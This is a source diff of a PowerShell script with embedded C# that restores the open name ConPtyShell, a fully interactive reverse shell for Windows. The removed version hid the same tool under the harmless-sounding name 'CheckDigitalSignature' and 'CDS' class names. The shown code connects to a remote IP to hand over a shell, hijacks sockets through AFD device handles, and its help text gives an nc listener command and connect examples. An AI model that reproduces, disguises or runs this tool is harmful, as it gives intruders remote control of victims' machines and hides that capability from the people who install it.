@@ -1,11 +1,79 @@
-function CheckDigitalSignature
-{   
+function Invoke-ConPtyShell
+{
+    <#
+        .SYNOPSIS
+            ConPtyShell - Fully Interactive Reverse Shell for Windows
+            Author: splinter_code
+            License: MIT
+            Source: https://github.com/antonioCoco/ConPtyShell
+
+        .DESCRIPTION
+            ConPtyShell - Fully interactive reverse shell for Windows
+
+            Properly set the rows and cols values. You can retrieve it from
+            your terminal with the command "stty size".
+
+            You can avoid to set rows and cols values if you run your listener
+            with the following command:
+                stty raw -echo; (stty size; cat) | nc -lvnp 3001
+
+            If you want to change the console size directly from powershell
+            you can paste the following commands:
+                $width=80
+                $height=24
+                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
+                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
+
+
+        .PARAMETER RemoteIp
+            The remote ip to connect
+        .PARAMETER RemotePort
+            The remote port to connect
+        .PARAMETER Rows
+            Rows size for the console
+            Default: "24"
+        .PARAMETER Cols
+            Cols size for the console
+            Default: "80"
+        .PARAMETER CommandLine
+            The commandline of the process that you are going to interact
+            Default: "powershell.exe"
+
+        .EXAMPLE
+            PS>Invoke-ConPtyShell 10.0.0.2 3001
+
+            Description
+            -----------
+            Spawn a reverse shell
+
+        .EXAMPLE
+            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
+
+            Description
+            -----------
+            Spawn a reverse shell with specific rows and cols size
+
+         .EXAMPLE
+            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
+
+            Description
+            -----------
+            Spawn a reverse shell (cmd.exe) with specific rows and cols size
+
+        .EXAMPLE
+            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
+
+            Description
+            -----------
+            Upgrade your current shell with specific rows and cols size
+
+    #>
     Param
     (
         [Parameter(Position = 0)]
         [String]
         $RemoteIp,
-        
+
         [Parameter(Position = 1)]
         [String]
         $RemotePort,
@@ -21,29 +89,29 @@ function CheckDigitalSignature
         [Parameter()]
         [String]
         $CommandLine = "powershell.exe",
-        
+
         [Parameter()]
         [Switch]
         $Upgrade
     )
-    
+
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
         $RemoteIp = "upgrade"
         $RemotePort = "shell"
     }
     else{
-  
+
         if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
             throw "RemoteIp missing parameter"
         }
-        
+
         if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
             throw "RemotePort missing parameter"
         }
     }
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Add-Type -TypeDefinition $Source -Language CSharp;
-    $output = [CDSMainClass]::ConPtyShellMain($parametersConPtyShell)
+    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
     Write-Output $output
 }
 
@@ -60,13 +128,13 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
-public class CDSException : Exception
+public class ConPtyShellException : Exception
 {
-    private const string error_string = "[-] CDSException: ";
+    private const string error_string = "[-] ConPtyShellException: ";
 
-    public CDSException() { }
+    public ConPtyShellException() { }
 
-    public CDSException(string message) : base(error_string + message) { }
+    public ConPtyShellException(string message) : base(error_string + message) { }
 }
 
 public class DeadlockCheckHelper
@@ -442,7 +510,7 @@ public static class SocketHijacking
 
     [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
-    
+
     //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
@@ -750,7 +818,7 @@ public static class SocketHijacking
         }
         IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
         ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
-        // Wait for Completion 
+        // Wait for Completion
         if (ntStatus == NTSTATUS_PENDING)
         {
             WaitForSingleObject(sockEvent, INFINITE);
@@ -798,7 +866,7 @@ public static class SocketHijacking
             }
         }
         if (targetSocketHandle == IntPtr.Zero)
-            throw new CDSException("No sockets found, so no hijackable sockets :( Exiting...");
+            throw new ConPtyShellException("No sockets found, so no hijackable sockets :( Exiting...");
         return targetSocketHandle;
     }
     public static void SetSocketBlockingMode(IntPtr socket, int mode)
@@ -812,7 +880,7 @@ public static class SocketHijacking
         else
             result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
         if (result == -1)
-            throw new CDSException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            throw new ConPtyShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
     }
 }
 
@@ -848,7 +916,7 @@ public struct ParentProcessUtilities
         int returnLength;
         int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
         if (status != 0)
-            throw new CDSException(status.ToString());
+            throw new ConPtyShellException(status.ToString());
         try
         {
             return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
@@ -863,7 +931,7 @@ public struct ParentProcessUtilities
 
 public static class ConPtyShell
 {
-    private const string errorString = "{{{CDSException}}}\r\n";
+    private const string errorString = "{{{ConPtyShellException}}}\r\n";
     private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
     private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
     private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
@@ -1089,7 +1157,7 @@ public static class ConPtyShell
     {
         WSAData data;
         if (WSAStartup(2 << 8 | 2, out data) != 0)
-            throw new CDSException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
     }
 
     private static IntPtr connectRemote(string remoteIp, int remotePort)
@@ -1104,7 +1172,7 @@ public static class ConPtyShell
         }
         catch
         {
-            throw new CDSException("Specified port is invalid: " + remotePort.ToString());
+            throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
         }
 
         IntPtr socket = IntPtr.Zero;
@@ -1117,7 +1185,7 @@ public static class ConPtyShell
         if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
         {
             error = WSAGetLastError();
-            throw new CDSException(String.Format("WSAConnect failed with error code: {0}", error));
+            throw new ConPtyShellException(String.Format("WSAConnect failed with error code: {0}", error));
         }
 
         return socket;
@@ -1153,9 +1221,9 @@ public static class ConPtyShell
         pSec.bInheritHandle = 1;
         pSec.lpSecurityDescriptor = IntPtr.Zero;
         if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CDSException("Could not create the InputPipe");
+            throw new ConPtyShellException("Could not create the InputPipe");
         if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CDSException("Could not create the OutputPipe");
+            throw new ConPtyShellException("Could not create the OutputPipe");
     }
 
     private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
@@ -1183,12 +1251,12 @@ public static class ConPtyShell
         IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         if (!GetConsoleMode(hStdOut, out outConsoleMode))
         {
-            throw new CDSException("Could not get console mode");
+            throw new ConPtyShellException("Could not get console mode");
         }
         outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
         if (!SetConsoleMode(hStdOut, outConsoleMode))
         {
-            throw new CDSException("Could not enable virtual terminal processing");
+            throw new ConPtyShellException("Could not enable virtual terminal processing");
         }
     }
 
@@ -1209,7 +1277,7 @@ public static class ConPtyShell
         bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
         if (success || lpSize == IntPtr.Zero)
         {
-            throw new CDSException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            throw new ConPtyShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
         startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -1217,12 +1285,12 @@ public static class ConPtyShell
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
         {
-            throw new CDSException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            throw new ConPtyShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
         success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
-            throw new CDSException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            throw new ConPtyShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
         return startupInfo;
     }
@@ -1238,7 +1306,7 @@ public static class ConPtyShell
         bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (!success)
         {
-            throw new CDSException("Could not create process. " + Marshal.GetLastWin32Error());
+            throw new ConPtyShellException("Could not create process. " + Marshal.GetLastWin32Error());
         }
         return pInfo;
     }
@@ -1424,7 +1492,7 @@ public static class ConPtyShell
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
-                            throw new CDSException("No \\Device\\Afd objects found. Socket duplication failed.");
+                            throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                         }
                         else
                         {
@@ -1539,7 +1607,7 @@ public static class ConPtyShell
     }
 }
 
-public static class CDSMainClass
+public static class ConPtyShellMainClass
 {
     private static string help = @"";
 
@@ -1551,7 +1619,7 @@ public static class CDSMainClass
     private static void CheckArgs(string[] arguments)
     {
         if (arguments.Length < 2)
-            throw new CDSException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+            throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
 
     private static void DisplayHelp()
@@ -1563,7 +1631,7 @@ public static class CDSMainClass
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new CDSException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
+            throw new ConPtyShellException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
         return ipString;
     }
 
@@ -1571,7 +1639,7 @@ public static class CDSMainClass
     {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
-            throw new CDSException("\r\nConPtyShell: Invalid integer value " + arg);
+            throw new ConPtyShellException("\r\nConPtyShell: Invalid integer value " + arg);
         return ret;
     }
 
@@ -1640,7 +1708,7 @@ class MainClass
 {
     static void Main(string[] args)
     {
-        Console.Out.Write(CDSMainClass.ConPtyShellMain(args));
+        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
     }
 }
 
